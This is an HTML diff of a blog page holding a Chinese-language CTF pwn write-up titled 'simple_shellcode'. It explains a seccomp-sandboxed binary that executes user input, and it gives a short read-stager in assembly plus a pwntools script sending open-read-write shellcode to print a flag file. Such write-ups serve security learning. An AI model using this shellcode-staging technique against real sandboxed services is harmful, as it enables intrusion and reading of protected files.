@@ -9,7 +9,7 @@
     
     <title>
         
-            Category: exercise |
+            simple_shellcode |
         
         b1nary
     </title>
@@ -115,7 +115,7 @@
                         </li>
                     
                         
-                        <li class="menu-item flex-start border-box active">
+                        <li class="menu-item flex-start border-box">
                             <a class="menu-text-color border-box" href="/categories">
                                 
                                     <i class="menu-text-color menu-icon fa-solid fa-layer-group"></i>
@@ -190,7 +190,7 @@
                 </li>
             
                 
-                <li class="drawer-menu-item border-box not-sub-menu active">
+                <li class="drawer-menu-item border-box not-sub-menu">
                     <label class="drawer-menu-label border-box">
                         <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
                             
@@ -220,40 +220,192 @@
             <div class="main-content border-box">
                 
 
-                    <div class="fade-in-down-animation">
-    <div class="category-archive-container border-box">
-        <div class="category-name">
-            <i class="fas fa-folder"></i>&nbsp;exercise
-        </div>
-        <div class="category-post-list">
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
             
-<div class="archive-list-container border-box">
-    
-        <section class="archive-item border-box">
-            <div class="archive-item-header border-box">
-                <span class="archive-year">2025</span>
-            </div>
-            <ul class="archive-item-body border-box">
+
+            <div class="post-content-bottom border-box">
                 
-                    <li class="post-item border-box">
-                        <span class="starting-point border-box flex-center"></span>
-                        <span class="post-date border-box">07-31</span>
-                        <a class="post-title border-box text-ellipsis"
-                           href="/2025/07/31/2021-%E9%B9%A4%E5%9F%8E%E6%9D%AF-littleof/"
-                        >[2021 鹤城杯]littleof</a>
-                    </li>
+                    <div class="post-title">
+                        simple_shellcode
+                    </div>
                 
-            </ul>
-        </section>
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/author.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">zach0ry</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-08-29</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Sat Aug 30 2025 19:54:58 GMT+0800">2025-08-30</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/exercise-pwn/">exercise_pwn</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/orw/">orw</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/code/">code</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
     
 </div>
 
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <p><a class="link"   target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/3488" >题目<i class="fas fa-external-link-alt"></i></a></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250829210231863.png"  alt="image-20250829210231863"></p>
+<ol>
+<li><strong><code>MEMORY[0xCAFE0000]</code></strong>: 这部分表示程序正在访问<strong>内存地址 <code>0xCAFE0000</code></strong> 处的内容。</li>
+<li><strong><code>()</code></strong>: 在 C&#x2F;C++ 等编程语言中，圆括号 <code>()</code> 通常表示<strong>函数调用</strong>。</li>
+</ol>
+<p>合起来，这句话的意思就是：<strong>将内存地址 <code>0xCAFE0000</code> 中的内容视为一个函数（或一段可执行代码），并立即执行它。</strong></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250829210242551.png"  alt="image-20250829210242551"></p>
+<p>该沙箱主要通过 <strong>seccomp 过滤器</strong>禁用了与<strong>执行新程序</strong>和<strong>提升权限</strong>相关的系统调用，特别是 <code>execve</code> 和 <code>execveat</code></p>
+<p>在main函数可以看到只能输入0x10个字符，这个长度无法构建shellcode</p>
+<p>所以调用一个长度足够的read函数读入(12个字节)</p>
+<p>read的三个参数。rdi是文件描述符，rsi是写入位置，rdx是写入长度</p>
+<p>rdx执行read的时候是0x10</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250829211121972.png" ></p>
+<p>但是当他运行到调用buf的时候，rdx的数值是buf的地址</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20250829211511121.png"  alt="image-20250829211511121"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor rdi, rdi：1 字节 (\x48\x31\xff)</span><br><span class="line">mov rsi, rdx：3 字节 (\x48\x89\xd6)</span><br><span class="line">add rsi, 0xc：3 字节 (\x48\x83\xc6\x0c)</span><br><span class="line">syscall：2 字节 (\x0f\x05)</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以对flag文件进行操作</p>
+<p>脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(os=&quot;linux&quot;, arch=&quot;amd64&quot;, log_level=&quot;debug&quot;)</span><br><span class="line">#io = remote(&quot;node5.anna.nssctf.cn&quot;, 21185)</span><br><span class="line">io = process(&quot;./vuln&quot;)</span><br><span class="line">elf = ELF(&quot;./vuln&quot;)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.recvuntil(b&quot;shellcode:\n&quot;)</span><br><span class="line"></span><br><span class="line">read_code = &quot;&quot;&quot;</span><br><span class="line">xor rdi, rdi</span><br><span class="line">mov rsi, rdx</span><br><span class="line">add rsi, 0xc</span><br><span class="line">syscall</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">io.send(asm(read_code))</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.open(&#x27;./flag&#x27;)</span><br><span class="line">shellcode += shellcraft.read(3, 0xCAFE0000 + 0x100, 0x100)</span><br><span class="line">shellcode += shellcraft.write(1, 0xCAFE0000 + 0x100, 0x100)</span><br><span class="line"></span><br><span class="line">io.sendline(asm(shellcode))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+                    
+                </div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/orw/">orw</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/code/">code</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/08/26/ZJCTF-2019-Login/"
+                                   title="[ZJCTF 2019]Login"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">[ZJCTF 2019]Login</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
         </div>
+
+        
     </div>
-    
-
-
-
 </div>
 
 
@@ -286,6 +438,27 @@
     </div>
 
     <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
     
 
     <!-- side tools -->
@@ -351,7 +524,6 @@
 
 
 
-
 <!-- common js -->
 
 <script src="/js/utils.js"></script>
@@ -381,12 +553,22 @@
 
     <!-- post page -->
     
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
 
     <!-- categories page -->
-    
-        
-<script src="/js/page/category-page.js"></script>
-
     
 
     <!-- links page -->
